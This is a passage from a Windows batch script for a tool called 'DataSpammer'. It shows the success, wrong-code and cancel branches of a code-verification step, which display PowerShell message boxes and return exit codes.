    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sucess', 'DataSpammer Verify');}"
    powershell -Command %msgBoxArgs%
    exit /b

:failed
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
    powershell -Command %msgBoxArgs%
    goto sys.verify.execution

:cancel 
    set EXIT_CODE=%ERRORLEVEL%
    if %EXIT_CODE% equ 0 set EXIT_CODE=1
    if "%OS%"=="Windows_NT" endlocal
    exit /b %EXIT_CODE%


exit 0
